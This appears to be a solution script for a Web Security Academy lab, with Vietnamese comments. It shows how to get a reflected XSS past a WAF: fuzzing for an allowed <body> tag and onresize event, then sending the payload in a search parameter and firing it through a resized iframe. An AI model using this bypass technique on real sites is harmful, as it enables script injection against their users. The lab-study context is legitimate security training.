# Web sử dụng WAF để bảo vệ
# Có thể thấy, khi nhập 1 tự khóa bất kỳ và xem source bằng devtool thì hoàn toàn không thấy vị trí xử lý
# Nhưng khi thử nhập 1 payload tấn công đơn giản ví dụ: "<script>alert(1)</script>" thì bị chặn ngay lập tức.
# Từ đó có thể dự đoạn việc WAF chặn các tag nhạy cảm
# Sử dụng Intruder của burpsuite để fuzzing tất cả các tag nhạy cảm để tìm ra payload tấn công hiệu quả
# Kết quả ta tìm ra được 1 tag không bị chặn (<body>)
# Vấn đề lại xảy ra tiếp đó là WAf tiếp tục chặn các event của thẻ <body>
# Chúng ta tiếp tục fuzzing để tìm ra event không bị chặn
# Kết quả tìm được event không bị chặn đó là (onresize)
# Từ đó xây dựng được payload tấn công: '<body onresize=alert(1)>'
# Khi chèn xong payload này vào trang, bạn chỉ cần dùng chuột co giãn nhẹ cửa sổ trình duyệt (hoặc bật/tắt F12 để thay đổi kích thước màn hình hiển thị), sự kiện onresize sẽ bị ép kích hoạt lập tức.
# Điều này thực sự khó khi bắt nạn nhân làm theo
# Kịch bản tấn công tiếp tục được bổ sung bằng cách chèn payload thông qua 1 iframe
# ta sẽ co chiều dài/rộng iframe lại 1 đoạn khiến mã độc thực thi ngay lập tức

import requests

burp0_url = "https://YOUR_HOST.web-security-academy.net:443"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "iframe",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "cross-site",
    "Priority": "u=4",
    "Te": "trailers"
}

requests.get(burp0_url, headers=burp0_headers,params={"search":"'><body onresize=print()>"})

